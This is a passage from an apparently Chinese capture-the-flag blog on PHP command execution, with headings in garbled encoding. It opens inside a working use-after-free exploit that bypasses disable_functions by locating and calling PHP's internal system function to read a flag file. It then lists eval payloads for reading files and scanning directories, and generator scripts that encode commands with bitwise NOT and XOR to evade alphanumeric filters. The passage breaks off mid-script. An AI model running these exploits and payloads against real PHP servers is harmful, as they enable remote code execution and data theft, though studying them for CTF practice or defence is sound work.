class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag02.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡disable-function">ç»•è¿‡disable_function</h5><p><strong>é€‚ç”¨äºevalç±»å‘½ä»¤æ‰§è¡Œ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰«ææ ¹ç›®å½•æœ‰ä»€ä¹ˆæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot; &quot;</span>);&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) !=<span class="literal">false</span>)&#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot; &quot;</span>;&#125;    </span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) != <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯»å–çš„è¯ä¸€èˆ¬éƒ½æ˜¯ç”¨çš„include(),highlight_file(),show_source(),readfile(),require(),require_once()ç­‰å‡½æ•°è¿›è¡Œè¯»å–</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç»“æœè¢«æ›¿æ¢ï¼Œå¯ä»¥åœ¨ä»£ç åè¾¹åŠ ä¸€ä¸ªexité€€å‡ºï¼Œè¿›è€Œç»•è¿‡å¯¹äºç»“æœçš„æ›¿æ¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/&#x27;</span>);<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$a</span>)) != <span class="literal">false</span>) &#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&quot;</span>;&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h3 id="evalç±»å‘½ä»¤æ‰§è¡Œ">evalç±»å‘½ä»¤æ‰§è¡Œ</h3><p>æ‰€è°“evalç±»å‘½ä»¤æ‰§è¡Œå³åŸé¢˜ä¸­ç»™å‡ºäº†eval()è¿™ä¸€å‡½æ•°ï¼Œå¹¶è®©å…¶å‚æ•°å¯æ§</p><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>evalå‡½æ•°çš„æœ¬è´¨æ˜¯å°†ä»»æ„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œgetå’Œpostä¼ å‚æ˜¯ä¼ å…¥çš„å‚æ•°é»˜è®¤éƒ½æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„ï¼Œæ­£å¥½ä¹Ÿä¸€å®šä¼šç¬¦åˆè¿™ä¸ªæ¡ä»¶</p><h4 id="æ— å­—æ¯æ•°å­—rce">æ— å­—æ¯æ•°å­—rce</h4><p>ç®€å•æ¥è¯´ï¼Œæ— å­—æ¯æ•°å­—rceå°±æ˜¯æŠŠæˆ‘ä»¬å¯æ§å‚æ•°ä¸­çš„æ•°å­—å’Œå­—æ¯éƒ½banæ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¸å¯è§å­—ç¬¦çš„è¿ç®—æ„é€ å‡ºå¯è§å­—ç¬¦ï¼Œå¹¶æ‰§è¡Œç›¸åº”å‘½ä»¤ï¼Œä¸‹é¢çš„ç»•è¿‡å§¿åŠ¿æœ¬è´¨éƒ½æ˜¯é€šè¿‡ä¸å¯è§å­—ç¬¦ä¹‹é—´çš„å…³ç³»è¿ç®—æ„é€ å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„å­—ç¬¦ä¸²å¹¶æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„å‘½ä»¤ã€‚</p><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å–åç»•è¿‡">å–åç»•è¿‡</h5><p>é€šè¿‡å–åæ“ä½œä½¿å¾—åŸå‘½ä»¤å˜ä¸ºä¸å¯è§å­—ç¬¦ï¼Œç»•è¿‡wafæ£€æµ‹ï¼Œåœ¨evalæ‰§è¡Œæ—¶å†é€šè¿‡å–åæ“ä½œè¿˜åŸä¸ºåŸæ¶æ„å‘½ä»¤ï¼Œè¿›è¡Œæ‰§è¡Œä»»æ„æ¶æ„ä»£ç </p><p><strong>æ„é€ è„šæœ¬1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;call_user_func&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;(~&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;,~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;,&#x27;&#x27;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ„é€ è„šæœ¬2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="å¼‚æˆ–ç»•è¿‡">å¼‚æˆ–ç»•è¿‡</h5><p>é€šè¿‡ä¸å¯è§å­—ç¬¦ä¹‹é—´çš„å¼‚æˆ–è¿ç®—æ„é€ å‡ºä»»æ„æ¶æ„å‘½ä»¤ï¼Œå°†ä¸¤ä¸ªè„šæœ¬æŒ‰ç…§è§„å®šå‘½åæ”¾åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ¯æ¬¡ä½¿ç”¨æ—¶éœ€è¦æ ¹æ®é¢˜ç›®ä»£ç æ›´æ¢phpè„šæœ¬ä¸­çš„æ­£åˆ™éƒ¨åˆ†ï¼Œæ›´æ”¹å¥½è¿è¡Œpythonä»£ç ï¼Œæ ¹æ®æç¤ºæ„é€ å³å¯</p><p>xor.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9A-Z]/i&#x27;</span>; <span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title 